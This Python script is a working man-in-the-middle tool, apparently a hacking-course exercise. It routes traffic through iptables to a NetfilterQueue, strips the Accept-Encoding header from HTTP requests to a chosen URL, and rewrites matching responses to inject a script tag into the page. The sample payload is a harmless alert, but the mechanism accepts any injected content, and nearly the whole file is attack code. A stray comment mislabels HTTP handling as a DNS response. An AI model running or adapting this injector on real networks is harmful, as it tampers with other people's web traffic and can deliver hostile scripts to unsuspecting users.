#!/usr/bin/env python

# Dependencies needed to manage netfilterqueue build-essential python<version>-dev libnetfilter-queue-dev
# After installing libnetfilter-queue-dev do not execute apt autoremove will break dependencies.
# Install module netfilterqueue as sudo
from netfilterqueue import NetfilterQueue
import argparse
import subprocess
import re
import logging
import scapy.all as scapy


ack_list_request = []
ack_list_response = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):  # DNS response
        if scapy_packet[scapy.TCP].dport == 80:
            if url_target.encode() in scapy_packet[scapy.Raw].load:
                print("[+] HTTP Request")
                ack_list_request.append(scapy_packet[scapy.TCP].ack)
                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load.decode())
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list_request:
                ack_list_response.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].ack in ack_list_response:
                if inject_in.encode() in scapy_packet[scapy.Raw].load:
                    print("[+] HTTP Response")
                    modified_load = scapy_packet[scapy.Raw]\
                        .load.decode()\
                        .replace(inject_in, inject_in + "<script>alert('Hello hacking world');</script>")
                    new_packet = set_load(scapy_packet, modified_load)
                    packet.set_payload(bytes(new_packet))

    # print(scapy_packet.show())  # Return the packet's payload as a byte object to see the packets.
    packet.accept()  # If it is accepted, it will be forwarded.


def setting_iptables(option, chain):
    subprocess.run(['iptables', option, chain, '-j', 'NFQUEUE', '--queue-num', '0'])
    iptables_output = subprocess.run(['iptables', '-S'], capture_output=True).stdout.decode()
    # print(iptables_output)
    print(chain + " -j NFQUEUE --queue-num 0" in iptables_output and "Ok\r" or "Erased", end='\n')


def chain_setting(chain_iptables_to_set, remove):
    if chain_iptables_to_set in "forward" and not remove:
        print('Inserting ' + chain_iptables_to_set + ' chain -> ', end='')
        setting_iptables('-I', "FORWARD")
    elif chain_iptables_to_set in "localhost" and not remove:
        print('Inserting OUTPUT chain -> ', end='')
        setting_iptables('-I', 'OUTPUT')
        print('Inserting INPUT chain -> ', end='')
        setting_iptables('-I', 'INPUT')
    elif remove:
        if chain_iptables_to_set in "forward":
            print('\rRemoved ' + chain_iptables_to_set + ' chain -> ', end='')
            setting_iptables('-D', "FORWARD")
        elif chain_iptables_to_set in "localhost":
            print('\rRemoved OUTPUT chain -> ', end='')
            setting_iptables('-D', 'OUTPUT')
            print('\rRemoved INPUT chain -> ', end='')
            setting_iptables('-D', 'INPUT')


arguments = argparse.ArgumentParser(description="Intercepting file - HTTP only")
arguments.add_argument('-c', '--iptables-chain', dest='chain_iptables', help='IPTABLES as forward or localhost')
arguments.add_argument('-url', '--url-target', dest='url_target', help='The url target')
arguments.add_argument('-inj', '--inject-in', dest='inject_in', help='Place to inject the code. Be careful, it must '
                                                                     'be a unique place. The arg must be between \'')

chain_iptables = arguments.parse_args().chain_iptables
url_target = arguments.parse_args().url_target
inject_in = arguments.parse_args().inject_in


netQueue = NetfilterQueue()
try:
    netQueue.bind(0, process_packet)
    chain_setting(chain_iptables, False)
    netQueue.run()
except KeyboardInterrupt:
    chain_setting(chain_iptables, True)
except BaseException as e:
    logging.exception(e)
    print("\nError has come up ... quiting", end='\n\n')
    chain_setting(chain_iptables, True)


netQueue.unbind()
